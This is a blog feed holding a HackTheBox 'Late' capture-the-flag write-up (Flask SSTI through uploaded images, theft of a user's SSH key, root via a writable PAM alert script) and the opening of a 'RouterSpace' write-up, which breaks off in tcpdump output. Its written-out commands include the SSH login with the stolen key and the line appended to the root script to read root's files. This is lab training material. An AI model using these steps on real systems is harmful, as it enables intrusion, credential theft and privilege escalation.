    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote><p><strong>OS</strong>: Linux<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 20<br><strong>Release</strong>: 23 Apr 2022<br><strong>IP</strong>: 10.10.11.156</p></blockquote><p>HackTheBox’s Late is an easy level machine.</p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="nmap-scanning-result"><a href="#nmap-scanning-result" class="headerlink" title="nmap scanning result"></a>nmap scanning result</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92 scan initiated Mon Apr 25 12:18:35 2022 as: nmap -sC -sV -oN scan.nmap -vvv 10.10.11.156</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.156</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.048s latency).</span><br><span class="line">Scanned at 2022-04-25 12:18:36 UTC <span class="keyword">for</span> 12s</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN</span><br><span class="line">|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=</span><br><span class="line">|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF</span><br><span class="line">|_http-title: Late - Best online image tools</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Mon Apr 25 12:18:48 2022 -- 1 IP address (1 host up) scanned in 12.91 seconds</span></span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>lets open the webpage in browser.</p><p><img src="https://i.imgur.com/EzrnRXd.png"></p><p>Then, place images.late.htb in the &#x2F;etc&#x2F;hosts file.</p><p>Let’s go to imges.late.htb in the browser.</p><p><img src="https://i.imgur.com/K4Ur8ea.png"></p><p>You can also see that it was created with flask, that also indicates that it could be vulnerable to SSTI injection.</p><p>The images are converted into text by the application. So, let’s use a editor then take screenshot like below.</p><p>Here’s an example of a payload image.</p><p><img src="https://i.imgur.com/Ysf2b28.png"></p><p>Upload the image into the application.</p><p><img src="https://i.imgur.com/VTfDF22.png"></p><p>After uploaded the image payload. We will get result.txt file automatically with executed payload’s answer. We confirmed that this application is vulnerable to SSTI.</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>so we can exploit the SSTI by calling os.popen().read()</p><p>Here’s an example of a payload.</p><p><img src="https://i.imgur.com/LN2MnFd.png"></p><p>Successfully executed.</p><p><img src="https://i.imgur.com/M8JyJci.png"></p><p>I’m attempting to obtain the svc acc user’s ssh key.</p><p>Here is the payload for obtaining the user’s ssh key.</p><p><img src="https://i.imgur.com/99B18P5.png"></p><p>We have the user ssh key.</p><p><img src="https://i.imgur.com/zwj2qED.png"></p><p>Save the key as svc acc key in a file.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 600 svc_acc_key</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -i svc_acc_key svc_acc@late.htb</span><br><span class="line">svc_acc@late:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">49a7b4001ac25b6969a8cff2af9xxxxx</span><br><span class="line">svc_acc@late:~$ </span><br></pre></td></tr></table></figure><p>Got User Flag.</p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>Nothing appears to be interesting or suspicious after running the linpeas.sh script.</p><p>I discovered something interesting after monitoring the running process.</p><blockquote><p>2022&#x2F;05&#x2F;08 09:14:02 CMD: UID&#x3D;0    PID&#x3D;25096  | cp &#x2F;root&#x2F;scripts&#x2F;ssh-alert.sh &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;ssh-alert.sh</p><p>2022&#x2F;05&#x2F;08 09:14:02 CMD: UID&#x3D;0    PID&#x3D;25093  | &#x2F;bin&#x2F;bash &#x2F;root&#x2F;scripts&#x2F;cron.sh</p><p>2022&#x2F;05&#x2F;08 09:14:02 CMD: UID&#x3D;0    PID&#x3D;25092  | &#x2F;bin&#x2F;sh -c &#x2F;root&#x2F;scripts&#x2F;cron.sh</p><p>2022&#x2F;05&#x2F;08 09:14:02 CMD: UID&#x3D;0    PID&#x3D;25091  | &#x2F;usr&#x2F;sbin&#x2F;CRON -f</p></blockquote><p>Analyze the &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;ssh-alert.sh script.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">svc_acc@late:/tmp$ <span class="built_in">cat</span> /usr/local/sbin/ssh-alert.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">RECIPIENT=<span class="string">&quot;root@late.htb&quot;</span></span><br><span class="line">SUBJECT=<span class="string">&quot;Email from Server Login: SSH Alert&quot;</span></span><br><span class="line"></span><br><span class="line">BODY=<span class="string">&quot;</span></span><br><span class="line"><span class="string">A SSH login was detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        User:        <span class="variable">$PAM_USER</span></span></span><br><span class="line"><span class="string">        User IP Host: <span class="variable">$PAM_RHOST</span></span></span><br><span class="line"><span class="string">        Service:     <span class="variable">$PAM_SERVICE</span></span></span><br><span class="line"><span class="string">        TTY:         <span class="variable">$PAM_TTY</span></span></span><br><span class="line"><span class="string">        Date:        `date`</span></span><br><span class="line"><span class="string">        Server:      `uname -a`</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;PAM_TYPE&#125;</span> = <span class="string">&quot;open_session&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Subject:<span class="variable">$&#123;SUBJECT&#125;</span> <span class="variable">$&#123;BODY&#125;</span>&quot;</span> | /usr/sbin/sendmail <span class="variable">$&#123;RECIPIENT&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>Every time we ssh into a machine, it sends an email to root with the username, date, and server name of the person who is accessing the machine.</p><p>We can take advantage of this to execute commands as root.</p><p>I attempted to modify the entire script but was unable to do so.</p><p>As a result, I only append the command.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cat /root/root.txt &gt; /tmp/root.txt;chown svc_acc:svc_acc /tmp/root.txt&quot;</span> &gt;&gt; /usr/local/sbin/ssh-alert.sh</span><br></pre></td></tr></table></figure><p>After that, SSH into the user. Our modified script was run as root.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -i svc_acc_key svc_acc@late.htb</span><br><span class="line">svc_acc@late:~$ <span class="built_in">cat</span> /tmp/root.txt </span><br><span class="line">6edb2bd94bb6168c9943e2d77adxxxxx</span><br><span class="line">svc_acc@late:~$ </span><br></pre></td></tr></table></figure><p>Boom…. Got RoOt Flag</p>]]></content>
    
    
    <summary type="html">Late was an easy box from hackthebox.</summary>
    
    
    
    <category term="HackTheBox" scheme="https://mdn1nj4.github.io/categories/HackTheBox/"/>
    
    
    <category term="rce" scheme="https://mdn1nj4.github.io/tags/rce/"/>
    
    <category term="htb" scheme="https://mdn1nj4.github.io/tags/htb/"/>
    
    <category term="ssti" scheme="https://mdn1nj4.github.io/tags/ssti/"/>
    
    <category term="exploit" scheme="https://mdn1nj4.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox - RouterSpace Writeup</title>
    <link href="https://mdn1nj4.github.io/htb/hackthebox-routerspace-writeup/"/>
    <id>https://mdn1nj4.github.io/htb/hackthebox-routerspace-writeup/</id>
    <published>2022-04-11T13:00:00.000Z</published>
    <updated>2025-05-08T07:31:28.263Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote><p><strong>OS</strong>: Linux<br><strong>Difficulty</strong>: Easy<br><strong>Points</strong>: 20<br><strong>Release</strong>: 26 Feb 2022<br><strong>IP</strong>: 10.10.11.148</p></blockquote><p>HackTheBox’s RouterSpace is an easy level machine.</p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="nmap-scanning-result"><a href="#nmap-scanning-result" class="headerlink" title="nmap scanning result"></a>nmap scanning result</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">Nmap 7.92 scan initiated Sun Feb 27 05:29:36 2022 as: nmap -sC -sV -oN scan.nmap -vvv 10.10.11.148</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.148</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.064s latency).</span><br><span class="line">Scanned at 2022-02-27 05:29:37 UTC <span class="keyword">for</span> 27s</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE REASON VERSION</span><br><span class="line">22/tcp open  ssh syn-ack ttl 63 (protocol 2.0)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|_SSH-2.0-RouterSpace Packet Filtering V1</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTJG10LrPb/oV0/FaR2FprNXTVtRobg1Jwy5UOJGrzjWqI8lNDf5DDi3ilSdkJZ0+0Rwr4/gKG5UlyvqCz07XrPfnWG+E7NrgpMpVKR4LF9fbX750gxK+hOSco3qQclv3CUTjTzwMgxf0ltyOg6WJvThYQ3CFDDeOc4T27YqQ/VgwBT92PWu6aZgWX2oAn+X8/fdcejGWeumU9b+rufiNt/pQ1dGUz+wkHeb2pIaA4WfEQLHB1xF33rTZuAXFDiKSb35EpPvhuShsMPQv6Q+NfLAiENgdy+UdybSNH6k1gmPHyroSYoXth7Pelpg+38V9SYtvvoxQRqBbaLApEClTnIM/IvQba9vY8VdfKYDGDcgeuPm8ksnOFPrb5L6axwl0K2ngE4VHQBJM0yxIRo5dELswD1c9O1tR2rq6MbW2giPl6dx/xzEbdVV6VO5n/prjsnpEs8YvNmnELrt6mt0FkcJQ9ageN5ji3pecKxKTVY4J71yf4+cVZKwpX8xI5H6E=</span><br><span class="line">|   256 7f:05:<span class="built_in">cd</span>:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiksdoNGb5HSVU5I64JPbS+qDrMnHaxiFkU+JKFH9VnP69mvgdIM9wTDl/WGjeWV2AJsl7NLQQ4W0goFL/Kz48=</span><br><span class="line">|   256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2psOHQ+E45S1f8MOulwczO6MLHRMr+DYtiyNM0SJw8</span><br><span class="line">80/tcp open  httpsyn-ack ttl 63</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">| HTTP/1.1 200 OK</span><br><span class="line">| X-Powered-By: RouterSpace</span><br><span class="line">| X-Cdn: RouterSpace-36197</span><br><span class="line">| Content-Type: text/html; charset=utf-8</span><br><span class="line">| Content-Length: 75</span><br><span class="line">| ETag: W/<span class="string">&quot;4b-KZcRsggwbUpRJYgbfVTb/p3UStY&quot;</span></span><br><span class="line">| Date: Sun, 27 Feb 2022 05:29:55 GMT</span><br><span class="line">| Connection: close</span><br><span class="line">| Suspicious activity detected !!! &#123;RequestID: Fg ZRH1 qQ R 4nHFujeu &#125;</span><br><span class="line">|   GetRequest: </span><br><span class="line">| HTTP/1.1 200 OK</span><br><span class="line">| X-Powered-By: RouterSpace</span><br><span class="line">| X-Cdn: RouterSpace-66742</span><br><span class="line">| Accept-Ranges: bytes</span><br><span class="line">| Cache-Control: public, max-age=0</span><br><span class="line">| Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT</span><br><span class="line">| ETag: W/<span class="string">&quot;652c-17d476c9285&quot;</span></span><br><span class="line">| Content-Type: text/html; charset=UTF-8</span><br><span class="line">| Content-Length: 25900</span><br><span class="line">| Date: Sun, 27 Feb 2022 05:29:55 GMT</span><br><span class="line">| Connection: close</span><br><span class="line">| &lt;!doctype html&gt;</span><br><span class="line">| &lt;html class=<span class="string">&quot;no-js&quot;</span> lang=<span class="string">&quot;zxx&quot;</span>&gt;</span><br><span class="line">| &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">| &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">| &lt;meta http-equiv=<span class="string">&quot;x-ua-compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">| &lt;title&gt;RouterSpace&lt;/title&gt;</span><br><span class="line">| &lt;meta name=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">| &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="line">| &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">| &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/owl.carousel.min.css&quot;</span>&gt;</span><br><span class="line">| &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/magnific-popup.css&quot;</span>&gt;</span><br><span class="line">| &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/font-awesome.min.css&quot;</span>&gt;</span><br><span class="line">| &lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;css/themify-icons.css&quot;</span>&gt;</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">| HTTP/1.1 200 OK</span><br><span class="line">| X-Powered-By: RouterSpace</span><br><span class="line">| X-Cdn: RouterSpace-97235</span><br><span class="line">| Allow: GET,HEAD,POST</span><br><span class="line">| Content-Type: text/html; charset=utf-8</span><br><span class="line">| Content-Length: 13</span><br><span class="line">| ETag: W/<span class="string">&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot;</span></span><br><span class="line">| Date: Sun, 27 Feb 2022 05:29:55 GMT</span><br><span class="line">| Connection: close</span><br><span class="line">| GET,HEAD,POST</span><br><span class="line">|   RTSPRequest, X11Probe: </span><br><span class="line">| HTTP/1.1 400 Bad Request</span><br><span class="line">|_Connection: close</span><br><span class="line">|_http-title: RouterSpace</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 29EA086BA90A060F34EF3D8115988BC1</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port22-TCP:V=7.92%I=7%D=2/27%Time=621B0C52%P=x86_64-pc-linux-gnu%r(NULL</span><br><span class="line">SF:,29,<span class="string">&quot;SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n&quot;</span>);</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">SF-Port80-TCP:V=7.92%I=7%D=2/27%Time=621B0C52%P=x86_64-pc-linux-gnu%r(GetR</span><br><span class="line">SF:equest,31BA,<span class="string">&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\n</span></span><br><span class="line"><span class="string">SF:X-Cdn:\x20RouterSpace-66742\r\nAccept-Ranges:\x20bytes\r\nCache-Control</span></span><br><span class="line"><span class="string">SF::\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x20202</span></span><br><span class="line"><span class="string">SF:1\x2011:33:57\x20GMT\r\nETag:\x20W/\&quot;652c-17d476c9285\&quot;\r\nContent-Type</span></span><br><span class="line"><span class="string">SF::\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x</span></span><br><span class="line"><span class="string">SF:20Sun,\x2027\x20Feb\x202022\x2005:29:55\x20GMT\r\nConnection:\x20close\</span></span><br><span class="line"><span class="string">SF:r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;zxx\&quot;&gt;\n&lt;</span></span><br><span class="line"><span class="string">SF:head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x20&lt;me</span></span><br><span class="line"><span class="string">SF:ta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\x20\</span></span><br><span class="line"><span class="string">SF:x20\x20&lt;title&gt;RouterSpace&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;desc</span></span><br><span class="line"><span class="string">SF:ription\&quot;\x20content=\&quot;\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;viewport\&quot;\</span></span><br><span class="line"><span class="string">SF:x20content=\&quot;width=device-width,\x20initial-scale=1\&quot;&gt;\n\n\x20\x20\x20\</span></span><br><span class="line"><span class="string">SF:x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\x</span></span><br><span class="line"><span class="string">SF:20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/owl\.carousel\.</span></span><br><span class="line"><span class="string">SF:min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/</span></span><br><span class="line"><span class="string">SF:magnific-popup\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20</span></span><br><span class="line"><span class="string">SF:href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;st</span></span><br><span class="line"><span class="string">SF:ylesheet\&quot;\x20href=\&quot;css/themify-icons\.css\&quot;&gt;\n\x20&quot;</span>)%r(HTTPOptions,10</span><br><span class="line">SF:8,<span class="string">&quot;HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20</span></span><br><span class="line"><span class="string">SF:RouterSpace-97235\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/h</span></span><br><span class="line"><span class="string">SF:tml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\&quot;d-bMedpZ</span></span><br><span class="line"><span class="string">SF:YGrVt1nR4x\+qdNZ2GqyRo\&quot;\r\nDate:\x20Sun,\x2027\x20Feb\x202022\x2005:29</span></span><br><span class="line"><span class="string">SF::55\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST&quot;</span>)%r(RTSPRequest</span><br><span class="line">SF:,2F,<span class="string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n</span></span><br><span class="line"><span class="string">SF:&quot;</span>)%r(X11Probe,2F,<span class="string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20</span></span><br><span class="line"><span class="string">SF:close\r\n\r\n&quot;</span>)%r(FourOhFourRequest,131,<span class="string">&quot;HTTP/1\.1\x20200\x20OK\r\nX-Po</span></span><br><span class="line"><span class="string">SF:wered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-36197\r\nContent-Type</span></span><br><span class="line"><span class="string">SF::\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2075\r\nETag:\x20W</span></span><br><span class="line"><span class="string">SF:/\&quot;4b-KZcRsggwbUpRJYgbfVTb/p3UStY\&quot;\r\nDate:\x20Sun,\x2027\x20Feb\x2020</span></span><br><span class="line"><span class="string">SF:22\x2005:29:55\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20acti</span></span><br><span class="line"><span class="string">SF:vity\x20detected\x20!!!\x20&#123;RequestID:\x20Fg\x20\x20ZRH1\x20qQ\x20R\x20</span></span><br><span class="line"><span class="string">SF:4nHFujeu\x20&#125;\n\n\n\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Feb 27 05:30:04 2022 -- 1 IP address (1 host up) scanned in 27.58 seconds</span></span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><p>lets open the webpage in browser.</p><p><img src="https://i.imgur.com/AWFNXij.png"></p><p>Then, from the webpage, download the <a href="http://10.10.11.148/RouterSpace.apk">http://10.10.11.148/RouterSpace.apk</a></p><p>I uploaded this apk to MobSF, but nothing interesting came up.</p><p>So I decided to install an apk in Android emulator and then try to intercept the request.</p><p>I use Android Studio, but you can use any emulator you want.</p><p>If you don’t know how to intercept requests from emulator, check out this:  <a href="https://medium.com/@bastian.ohm/analyse-network-traffic-with-burp-suite-on-android-3cefbf02af2e" title="https://medium.com/@bastian.ohm/analyse-network-traffic-with-burp-suite-on-android-3cefbf02af2e">https:&#x2F;&#x2F;medium.com&#x2F;@bastian.ohm&#x2F;analyse-network-traffic-with-burp-suite-on-android-3cefbf02af2e</a></p><p><a href="https://imgur.com/a/TSDZhsD" title="TSDZhsD">TSDZhsD</a></p><p>lets add routerspace.htb in &#x2F;etc&#x2F;hosts</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>POST &#x2F;api&#x2F;v4&#x2F;monitoring&#x2F;router&#x2F;dev&#x2F;check&#x2F;deviceAccess HTTP&#x2F;1.1<br>accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>user-agent: RouterSpaceAgent<br>Content-Type: application&#x2F;json<br>Content-Length: 16<br>Host: routerspace.htb<br>Connection: close<br>Accept-Encoding: gzip, deflate</p><p>{“ip”:”10.10.14.xx”}</p><p>I changed the IP to mine and received a request from routerspace.htb.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i tun0 </span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span><br><span class="line">01:08:51.272117 IP infosec.52882 &gt; routerspace.htb.http: Flags [S], <span class="built_in">seq</span> 2011016043, win 